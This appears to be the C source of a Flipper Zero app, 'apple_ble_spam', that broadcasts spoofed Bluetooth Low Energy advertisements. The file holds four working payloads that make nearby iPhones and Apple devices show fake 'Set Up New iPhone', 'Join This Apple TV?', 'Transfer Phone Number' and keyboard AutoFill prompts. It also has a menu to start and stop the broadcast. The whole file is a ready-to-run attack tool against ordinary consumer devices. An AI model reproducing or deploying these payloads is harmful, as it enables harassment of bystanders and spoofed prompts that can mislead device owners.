#include <dialogs/dialogs.h>
#include <gui/gui.h>
#include <gui/view_dispatcher.h>
#include <gui/modules/empty_screen.h>
#include <assets_icons.h>
#include "apple_ble_spam_icons.h"
#include <furi_hal_bt.h>

#define PAYLOAD_ADV_LEN 23

typedef struct {
    const char* title;
    const char* text;
    const uint8_t adv[PAYLOAD_ADV_LEN];
} Payload;

// Payload data by @techryptic
// https://techryptic.github.io/2023/09/01/Annoying-Apple-Fans/

static const Payload payloads[] = {
    {
        .title = "Apple Keyboard",
        .text = "'Password AutoFill for Apple TV Keyboard' banner notification",
        .adv = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
                0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
    },
    {
        .title = "New iPhone",
        .text = "'Set Up New iPhone' dialog on homescreen and lockscreen",
        .adv = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
                0xc0, 0x09, 0x60, 0x4c, 0x95, 0x01, 0x00, 0x10, 0x00, 0x00, 0x00},
    },
    {
        .title = "Join AppleTV",
        .text = "'Join This Apple TV?' dialog on homescreen and lockscreen",
        .adv = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
                0xc0, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
    },
    {
        .title = "Transfer Number",
        .text = "'Transfer Phone Number' dialog on homescreen and lockscreen",
        .adv = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
                0xc0, 0x02, 0x60, 0x4c, 0x95, 0x01, 0x00, 0x10, 0x00, 0x00, 0x00},
    },
};

static DialogMessageButton show_payload(DialogsApp* d, DialogMessage* m, size_t payload_index) {
    const Payload* payload = &payloads[payload_index];

    dialog_message_set_header(m, payload->title, 14, 4, AlignLeft, AlignTop);
    dialog_message_set_text(m, payload->text, 4, 18, AlignLeft, AlignTop);
    dialog_message_set_icon(m, &I_apple_10px, 3, 3);

    DialogMessageButton result = dialog_message_show(d, m);

    dialog_message_set_header(m, NULL, 0, 0, AlignLeft, AlignTop);
    dialog_message_set_text(m, NULL, 0, 0, AlignLeft, AlignTop);
    dialog_message_set_icon(m, NULL, 0, 0);

    return result;
}

static void toggle_payload(bool* advertising, size_t payload_index) {
    *advertising = !*advertising;
    if(*advertising) {
        const Payload* payload = &payloads[payload_index];
        furi_hal_bt_set_custom_adv_data(payload->adv, PAYLOAD_ADV_LEN);
    } else {
        furi_hal_bt_set_custom_adv_data(NULL, 0);
    }
}

int32_t apple_ble_spam(void* p) {
    UNUSED(p);
    DialogsApp* dialogs = furi_record_open(RECORD_DIALOGS);
    DialogMessage* message = dialog_message_alloc();

    Gui* gui = furi_record_open(RECORD_GUI);
    ViewDispatcher* view_dispatcher = view_dispatcher_alloc();
    EmptyScreen* empty_screen = empty_screen_alloc();
    const uint32_t empty_screen_index = 0;

    size_t payload_index = 0;
    bool advertising = false;
    DialogMessageButton screen_result;

    view_dispatcher_add_view(
        view_dispatcher, empty_screen_index, empty_screen_get_view(empty_screen));
    view_dispatcher_attach_to_gui(view_dispatcher, gui, ViewDispatcherTypeFullscreen);
    view_dispatcher_switch_to_view(view_dispatcher, empty_screen_index);

    bool running = true;
    while(running) {
        const char* ok_btn = advertising ? "Stop" : "Start";
        if(payload_index == 0) {
            dialog_message_set_buttons(message, NULL, ok_btn, "Next");
        } else if(payload_index == COUNT_OF(payloads) - 1) {
            dialog_message_set_buttons(message, "Back", ok_btn, NULL);
        } else {
            dialog_message_set_buttons(message, "Back", ok_btn, "Next");
        }

        screen_result = show_payload(dialogs, message, payload_index);

        switch(screen_result) {
        case DialogMessageButtonCenter:
            toggle_payload(&advertising, payload_index);
            break;
        case DialogMessageButtonLeft:
            if(payload_index > 0) {
                if(advertising) toggle_payload(&advertising, payload_index);
                payload_index--;
            }
            break;
        case DialogMessageButtonRight:
            if(payload_index < COUNT_OF(payloads) - 1) {
                if(advertising) toggle_payload(&advertising, payload_index);
                payload_index++;
            }
            break;
        case DialogMessageButtonBack:
            if(advertising) toggle_payload(&advertising, payload_index);
            running = false;
            break;
        }
    }

    dialog_message_free(message);
    furi_record_close(RECORD_DIALOGS);

    view_dispatcher_remove_view(view_dispatcher, empty_screen_index);
    view_dispatcher_free(view_dispatcher);
    empty_screen_free(empty_screen);
    furi_record_close(RECORD_GUI);

    return 0;
}
